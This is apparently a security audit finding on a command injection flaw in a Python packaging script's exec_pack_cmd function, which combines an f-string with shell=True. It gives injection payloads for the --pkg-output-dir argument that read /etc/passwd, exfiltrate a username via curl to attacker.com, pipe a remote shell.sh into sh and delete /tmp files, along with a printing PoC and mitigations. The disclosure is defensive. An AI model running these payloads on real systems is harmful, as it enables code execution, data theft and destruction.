# VULN-008：packer.py命令注入漏洞

## Vulnerability Summary

| Attribute | Value |
|-----------|-------|
| **ID** | VULN-008 |
| **Type** | Command Injection |
| **CWE** | CWE-78 (OS Command Injection) |
| **Severity** | Critical |
| **Confidence** | 95% |
| **File** | `scripts/package/common/py/packer.py` |
| **Lines** | 206-220 |
| **Function** | `exec_pack_cmd` |
| **Status** | CONFIRMED - Real Vulnerability |

## Vulnerable Code

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str: 
    """执行打包命令"""
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'  # VULNERABLE: f-string interpolation
    else:
        cmd = pack_cmd
    CommLog.cilog_info("package cmd:%s", cmd)
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)  # VULNERABLE: shell=True
    output = result.stdout.decode()
    if result.returncode != 0:
        CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
        raise CompressError(package_name)
    return package_name
```

## Complete Data Flow Analysis

### 1. Primary Attack Vector: `delivery_dir`

```
CLI Argument --pkg-output-dir
         │
         ▼
    args.pkg_output_dir  (package.py:808)
         │
         ▼
    get_compress_cmd(delivery_dir=pkg_output_dir, ...)  (package.py:437)
         │
         ▼
    exec_pack_cmd(delivery_dir, pack_cmd, ...)  (package.py:72)
         │
         ▼
    cmd = f'cd {delivery_dir} && {pack_cmd}'  (packer.py:211)
         │
         ▼
    subprocess.run(cmd, shell=True, ...)  (packer.py:215)
```

### 2. Secondary Attack Vector: `pack_cmd` components

The `pack_cmd` is constructed via `compose_makeself_command()` and includes:
- `source_target` = `pkg_args.pkg_output_dir` (also attacker-controlled)
- `cleanup` from XML config (`package_attr.get('cleanup')`)
- `install_script` from XML config
- `help_info` from XML config

## Attack Vectors

### Vector 1: Direct Command-Line Injection

**Attack Command:**
```bash
python scripts/package/package.py \
    --pkg-output-dir "; id; cat /etc/passwd; echo '" \
    --pkg-name <valid_pkg> \
    --independent_pkg
```

**Resulting Shell Command:**
```bash
cd ; id; cat /etc/passwd; echo ' && <pack_cmd>
```

**Effect:** Executes `id`, `cat /etc/passwd`, then `echo` command.

### Vector 2: Backtick Command Substitution

**Attack Command:**
```bash
python scripts/package/package.py \
    --pkg-output-dir "`whoami`" \
    --pkg-name <valid_pkg>
```

**Resulting Shell Command:**
```bash
cd `whoami` && <pack_cmd>
```

### Vector 3: Variable Expansion

**Attack Command:**
```bash
python scripts/package/package.py \
    --pkg-output-dir '$(curl http://attacker.com/$(whoami))' \
    --pkg-name <valid_pkg>
```

**Effect:** Exfiltrates username to attacker-controlled server.

### Vector 4: Newline Injection

**Attack Command:**
```bash
python scripts/package/package.py \
    --pkg-output-dir $'/tmp\nrm -rf /tmp/*\n#' \
    --pkg-name <valid_pkg>
```

## Exploitation Scenarios

### Scenario 1: CI/CD Pipeline Compromise

If this script is used in a CI/CD pipeline where build parameters can be influenced:
1. Attacker gains access to build configuration or environment
2. Modifies `--pkg-output-dir` parameter in build script
3. Arbitrary commands execute during packaging phase
4. Potential for supply chain attack on downstream consumers

### Scenario 2: Developer Machine Compromise

If an attacker can trick a developer into running:
```bash
# Malicious "build script" from untrusted source
python scripts/package/package.py --pkg-output-dir "$(curl attacker.com/shell.sh|sh)" ...
```

### Scenario 3: Privilege Escalation

If the script runs with elevated privileges (e.g., in Docker with root, or via sudo):
- Full system compromise
- Data exfiltration
- Persistent backdoor installation

## Attack Complexity Assessment

| Factor | Rating | Reason |
|--------|--------|--------|
| **Attack Vector** | Local/Adjacent | Requires ability to invoke script with crafted arguments |
| **Attack Complexity** | Low | No special conditions required |
| **Privileges Required** | Low | Need to invoke build script |
| **User Interaction** | None | Once arguments are controlled, no interaction needed |
| **Scope** | Unchanged | Affects only the system running the script |
| **Impact** | High | Full command execution with script's privileges |

## Exploitability: MEDIUM-HIGH

### Factors Reducing Exploitability:
1. Script is a build tool, not an internet-facing service
2. Requires ability to control command-line arguments
3. Attacker typically already has similar access level

### Factors Increasing Exploitability:
1. Common in CI/CD pipelines where parameters can be injected
2. `shell=True` with f-string is a classic injection pattern
3. No input sanitization whatsoever
4. Used in software supply chain (CANN is Huawei's AI framework)

## Proof of Concept

```python
#!/usr/bin/env python3
# PoC for VULN-008 Command Injection
# This demonstrates the vulnerability in exec_pack_cmd()

import subprocess

# Simulated vulnerable function
def exec_pack_cmd_vulnerable(delivery_dir: str, pack_cmd: str) -> None:
    """Vulnerable function from packer.py"""
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    print(f"[VULNERABLE] Executing: {cmd}")
    # subprocess.run(cmd, shell=True, check=False)  # Actual vulnerable call

# Test cases demonstrating injection
test_cases = [
    ("; id", "echo 'test'"),
    ("$(whoami)", "echo 'test'"),
    ("`cat /etc/passwd`", "echo 'test'"),
    ("/tmp; curl http://attacker.com/exfil", "echo 'test'"),
]

print("=== Command Injection PoC ===\n")
for delivery_dir, pack_cmd in test_cases:
    exec_pack_cmd_vulnerable(delivery_dir, pack_cmd)
    print()

print("All payloads would execute with shell=True")
```

## Recommended Mitigations

### Option 1: Remove shell=True (Recommended)

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # Use subprocess without shell=True
        # First cd to directory, then execute pack_cmd
        result = subprocess.run(
            pack_cmd.split(),  # Split command into list
            cwd=delivery_dir,  # Use cwd parameter instead of cd
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    else:
        result = subprocess.run(
            pack_cmd.split(),
            check=False,
            stdout=PIPE,
            stderr=STDOUT
        )
    # ... rest of function
```

### Option 2: Use shlex.quote() for Sanitization

```python
import shlex

def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # Sanitize delivery_dir
        safe_dir = shlex.quote(delivery_dir)
        cmd = f'cd {safe_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    # Still prefer removing shell=True
```

### Option 3: Validate Path Input

```python
import os

def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # Validate that delivery_dir is a real, safe directory
        delivery_dir = os.path.realpath(delivery_dir)
        if not os.path.isdir(delivery_dir):
            raise ValueError(f"Invalid delivery_dir: {delivery_dir}")
        # Additional validation: ensure path doesn't contain shell metacharacters
        if any(c in delivery_dir for c in ';$`|&<>(){}[]'):
            raise ValueError(f"Invalid characters in delivery_dir")
    # ... rest of function
```

## References

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **OWASP**: Command Injection - https://owasp.org/www-community/attacks/Command_Injection
- **Python Security**: subprocess.run() with shell=True - https://docs.python.org/3/library/subprocess.html#security-considerations

## Conclusion

**VERDICT: CONFIRMED - REAL VULNERABILITY**

This is a confirmed command injection vulnerability. While the attack requires control over command-line arguments (reducing the attack surface), the lack of any input sanitization combined with `shell=True` creates a genuine security risk, particularly in:

1. CI/CD environments where build parameters may be dynamically generated
2. Build scripts that chain multiple tools together
3. Any scenario where an attacker can influence script arguments

The vulnerability should be fixed by removing `shell=True` and using `subprocess.run()` with a list of arguments and the `cwd=` parameter for directory changes.
